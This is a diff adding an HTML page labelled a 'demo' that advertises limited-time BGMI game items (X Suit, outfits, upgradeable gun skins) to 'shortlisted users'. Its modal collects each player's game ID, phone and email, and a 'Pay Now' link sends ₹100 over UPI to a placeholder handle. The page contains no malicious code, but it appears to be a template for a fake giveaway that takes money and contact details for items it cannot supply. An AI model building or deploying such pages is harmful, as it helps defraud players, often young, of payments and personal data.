@@ -1,0 +1,198 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Offers — BGMI Redeem Demo</title>
+  <style>
+    /* Simple modern styling */
+    :root{--bg:#0f1724;--card:#0b1220;--accent:#ff6b6b;--muted:#94a3b8}
+    body{margin:0;font-family:Inter, system-ui, Arial;background:linear-gradient(180deg,#071026 0%, #0f1724 100%);color:#e6eef8}
+    .container{max-width:1100px;margin:36px auto;padding:20px}
+    header{display:flex;align-items:center;justify-content:space-between}
+    h1{margin:0;font-size:28px;letter-spacing:0.4px}
+    .grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(260px,1fr));gap:18px;margin-top:20px}
+    .card{background:var(--card);padding:16px;border-radius:12px;box-shadow:0 6px 18px rgba(2,6,23,0.6);border:1px solid rgba(255,255,255,0.03)}
+    .img{height:150px;border-radius:8px;background:linear-gradient(135deg,#0b1220,#122233);display:flex;align-items:center;justify-content:center;color:var(--muted);font-weight:600;margin-bottom:12px}
+    .title{font-size:18px;margin:0 0 6px}
+    .desc{color:var(--muted);font-size:13px;margin:0 0 12px}
+    .btn{padding:10px 14px;border-radius:8px;border:none;font-weight:600;cursor:pointer}
+    .redeem{background:linear-gradient(90deg,var(--accent),#ff8a5c);color:white}
+    .info{background:transparent;border:1px solid rgba(255,255,255,0.06);color:var(--muted);padding:8px;border-radius:8px;font-size:13px}
+    footer{margin-top:26px;color:var(--muted);font-size:13px;text-align:center}
+    /* Modal */
+    .modal-back{position:fixed;inset:0;background:rgba(0,0,0,0.6);display:none;align-items:center;justify-content:center;padding:18px;z-index:60}
+    .modal{width:100%;max-width:480px;background:#071425;padding:18px;border-radius:12px;border:1px solid rgba(255,255,255,0.03)}
+    label{display:block;font-size:13px;color:var(--muted);margin:8px 0 6px}
+    input{width:100%;padding:10px;border-radius:8px;border:1px solid rgba(255,255,255,0.06);background:transparent;color:#e6eef8}
+    .row{display:flex;gap:10px}
+    .small{font-size:12px;color:var(--muted);margin-top:8px}
+    .close-btn{background:transparent;border:1px solid rgba(255,255,255,0.06);color:var(--muted);padding:8px 10px;border-radius:8px}
+    @media (max-width:480px){h1{font-size:20px}}
+  </style>
+</head>
+<body>
+  <div class="container">
+    <header>
+      <h1>Game Offers — Redeem Page (Demo)</h1>
+      <div style="text-align:right;color:var(--muted)">
+        Demo mode • No passwords collected
+      </div>
+    </header>
+
+    <p style="color:var(--muted);margin-top:12px">
+      Yahan x suit, latest outfit aur upgrade-able gun skins dikh rahe hain. Redeem pe click karo, BGMI ID do (sirf ID/phone/email). Payment agar chahiye to UPI button use karo.
+    </p>
+
+    <section class="grid" id="offers">
+      <!-- Card: X Suit -->
+      <div class="card">
+        <div class="img">X SUIT (Image)</div>
+        <h3 class="title">X Suit — Ultimate Set</h3>
+        <p class="desc">Limited time: full X Suit + helmet skin. Sirf shortlisted users ke liye.</p>
+        <div style="display:flex;gap:8px;align-items:center">
+          <button class="btn redeem" onclick="openRedeem('X Suit','Ultimate Set')">Redeem</button>
+          <div style="flex:1"></div>
+          <div class="info">Running now</div>
+        </div>
+      </div>
+
+      <!-- Card: Latest Outfit -->
+      <div class="card">
+        <div class="img">Latest Outfit</div>
+        <h3 class="title">Aurora Outfit — Latest Drop</h3>
+        <p class="desc">Bright neon outfit with exclusive emote. Updateable with currency.</p>
+        <div style="display:flex;gap:8px;align-items:center">
+          <button class="btn redeem" onclick="openRedeem('Aurora Outfit','Latest Drop')">Redeem</button>
+          <div style="flex:1"></div>
+          <div class="info">New</div>
+        </div>
+      </div>
+
+      <!-- Card: Upgradeable Gun Skins -->
+      <div class="card">
+        <div class="img">Gun Skins</div>
+        <h3 class="title">Upgradeable Gun Skins</h3>
+        <p class="desc">Start with base skin → upgrade to legendary using tokens.</p>
+        <div style="display:flex;gap:8px;align-items:center">
+          <button class="btn redeem" onclick="openRedeem('Gun Skin Pack','Upgradeable')">Redeem</button>
+          <div style="flex:1"></div>
+          <div class="info">Upgradeable</div>
+        </div>
+      </div>
+
+      <!-- Card: Bundle -->
+      <div class="card">
+        <div class="img">Bundle</div>
+        <h3 class="title">Starter Bundle — Combo</h3>
+        <p class="desc">Suit + Outfit + 1 gun skin — bundle discount.</p>
+        <div style="display:flex;gap:8px;align-items:center">
+          <button class="btn redeem" onclick="openRedeem('Starter Bundle','Combo')">Redeem</button>
+          <div style="flex:1"></div>
+          <div class="info">Hot</div>
+        </div>
+      </div>
+    </section>
+
+    <footer>
+      © Demo • Replace BGMI ID handling with your backend (Firebase) • No passwords collected
+    </footer>
+  </div>
+
+  <!-- Redeem Modal -->
+  <div id="modalBack" class="modal-back" onclick="closeModal(event)">
+    <div class="modal" role="dialog" aria-modal="true" onclick="event.stopPropagation()">
+      <h2 id="modalTitle">Redeem</h2>
+
+      <div id="offerInfo" style="color:var(--muted);margin-bottom:8px">Offer: —</div>
+
+      <label>BGMI ID</label>
+      <input id="bgmiId" placeholder="Enter BGMI ID (example: ABC123)" />
+
+      <label>Phone (optional)</label>
+      <input id="phone" placeholder="10 digit mobile number" />
+
+      <label>Email (optional)</label>
+      <input id="email" placeholder="you@example.com" />
+
+      <div class="small">Safe reminder: Kabhi bhi password mat bhejo. Sirf BGMI ID / Phone / Email chahiye.</div>
+
+      <div style="display:flex;gap:8px;margin-top:12px">
+        <button class="btn redeem" onclick="submitRedeem()">Submit Request</button>
+        <button class="close-btn" onclick="closeModal()">Cancel</button>
+      </div>
+
+      <hr style="margin:12px 0;border:none;border-top:1px solid rgba(255,255,255,0.04)">
+
+      <!-- Optional Pay Now (UPI deep link). Replace pa= with your UPI ID -->
+      <div style="text-align:center">
+        <div style="color:var(--muted);margin-bottom:8px">Agar user payment karega to:</div>
+        <!-- Example UPI link: replace yourupiid@bank and am amount -->
+        <a id="upiLink" href="upi://pay?pa=yourupiid@paytm&pn=YourBusinessName&am=100&cu=INR">
+          <button class="btn" style="background:#0ea5a9">Pay Now (UPI ₹100)</button>
+        </a>
+        <div style="margin-top:8px;color:var(--muted);font-size:13px">Note: UPI apps show registered name — use merchant handle if you want custom display.</div>
+      </div>
+
+      <div id="status" style="margin-top:10px;color:#9be7b6"></div>
+    </div>
+  </div>
+
+  <script>
+    // Simple front-end demo logic (no backend)
+    let currentOffer = null;
+    function openRedeem(name, tag){
+      currentOffer = {name, tag};
+      document.getElementById('modalBack').style.display='flex';
+      document.getElementById('modalTitle').innerText = 'Redeem: ' + name;
+      document.getElementById('offerInfo').innerText = 'Offer detail: ' + tag;
+      document.getElementById('status').innerText = '';
+      // Pre-fill example amount in UPI link if you want (optional)
+      // document.getElementById('upiLink').href = 'upi://pay?pa=yourupiid@paytm&pn=YourBusinessName&am=100&cu=INR';
+    }
+    function closeModal(e){
+      if(e && e.target.id !== 'modalBack') return;
+      document.getElementById('modalBack').style.display='none';
+      document.getElementById('bgmiId').value='';
+      document.getElementById('phone').value='';
+      document.getElementById('email').value='';
+    }
+
+    function submitRedeem(){
+      const bgmi = document.getElementById('bgmiId').value.trim();
+      const phone = document.getElementById('phone').value.trim();
+      const email = document.getElementById('email').value.trim();
+
+      if(!bgmi){
+        document.getElementById('status').innerText = 'BGMI ID daal bhai.';
+        return;
+      }
+
+      // Demo: show saved message. Replace with Firebase / backend call in real app.
+      const payload = {
+        offer: currentOffer,
+        bgmiId: bgmi,
+        phone: phone || null,
+        email: email || null,
+        time: new Date().toISOString()
+      };
+
+      // For demo we save to localStorage so you can test later on admin panel
+      const list = JSON.parse(localStorage.getItem('redeems_demo') || '[]');
+      list.push(payload);
+      localStorage.setItem('redeems_demo', JSON.stringify(list));
+
+      document.getElementById('status').innerText = 'Request saved (demo). Admin check ke baad redeem kar dena.';
+      // Optionally auto-close after 1.2s
+      setTimeout(()=> closeModal(), 1200);
+    }
+
+    // Utility: open modal if admin wants to view saved demo data (dev only)
+    window.viewSavedDemo = function(){
+      const list = JSON.parse(localStorage.getItem('redeems_demo') || '[]');
+      console.log('Saved requests:', list);
+      alert('Saved requests in console. Open console (F12) to view.');
+    }
+  </script>
+</body>
+</html>
